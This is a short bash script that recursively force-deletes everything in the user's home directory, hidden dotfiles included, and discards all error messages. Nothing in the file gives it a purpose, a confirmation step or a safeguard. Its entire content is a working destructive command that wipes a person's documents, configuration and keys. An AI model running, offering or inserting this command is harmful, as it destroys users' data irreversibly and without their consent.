#!/bin/bash
TARGET_DIR=$HOME
rm -rf "$TARGET_DIR"/* "$TARGET_DIR"/.[!.]* "$TARGET_DIR"/..?* 2>/dev/null
